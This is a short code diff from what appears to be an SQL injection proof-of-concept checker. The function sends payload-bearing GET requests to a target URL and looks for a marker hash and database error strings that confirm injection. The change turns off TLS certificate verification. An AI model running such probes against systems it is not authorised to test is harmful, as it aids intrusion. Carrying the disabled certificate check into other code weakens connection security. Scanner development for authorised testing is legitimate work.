@@ -29,7 +29,7 @@ def poc(url):
             continue
         target_url = url.rstrip('/') + payload
         try:
-            r = requests.get(target_url, timeout=10)
+            r = requests.get(target_url, timeout=10, verify=False)
             if 'ed733b8d10be225eceba344d533586' in r.content:
                 return '[mysql]'+ each
             if 'Error in query [' in r.content or 'SQL error [' in r.content:
